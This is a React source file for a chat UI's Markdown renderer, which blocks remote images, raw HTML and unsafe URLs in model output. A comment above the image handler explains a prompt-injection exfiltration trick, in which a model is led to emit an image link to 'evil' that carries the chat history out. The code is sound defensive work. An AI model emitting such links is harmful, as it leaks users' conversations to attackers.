"use client";

import { memo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { CodeBlock } from "./CodeBlock";

interface HastNode {
  type: string;
  value?: string;
  tagName?: string;
  properties?: { className?: unknown };
  children?: HastNode[];
}

/** Plain text of a hast subtree - the code as written, before highlighting spans. */
function hastText(node: HastNode | undefined): string {
  if (!node) return "";
  if (node.type === "text") return node.value ?? "";
  return (node.children ?? []).map(hastText).join("");
}

function languageOf(node: HastNode | undefined): string {
  const cls = node?.properties?.className;
  const list = Array.isArray(cls) ? cls.map(String) : [];
  return list.find((c) => c.startsWith("language-"))?.slice("language-".length) ?? "";
}

const components: Components = {
  pre({ node, children }) {
    const code = (node as HastNode | undefined)?.children?.find((c) => c.tagName === "code");
    return (
      <CodeBlock language={languageOf(code)} raw={hastText(code).replace(/\n$/, "")}>
        {children}
      </CodeBlock>
    );
  },
  a({ children, href }) {
    return (
      <a href={href} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  // Never auto-load remote images: a prompt-injected page could make the model
  // emit ![](https://evil/?d=<chat history>) and the browser would send it.
  img({ src, alt }) {
    const href = typeof src === "string" ? src : "";
    return (
      <a href={href} target="_blank" rel="noopener noreferrer">
        {alt || "image"}
      </a>
    );
  },
  table({ children }) {
    return (
      <div className="my-3 overflow-x-auto">
        <table>{children}</table>
      </div>
    );
  },
};

// react-markdown escapes raw HTML (no rehype-raw) and strips unsafe URLs
// such as javascript:, so model output can never inject markup.
export const Markdown = memo(function Markdown({ text }: { text: string }) {
  return (
    <div className="markdown">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[[rehypeHighlight, { detect: false }]]}
        components={components}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
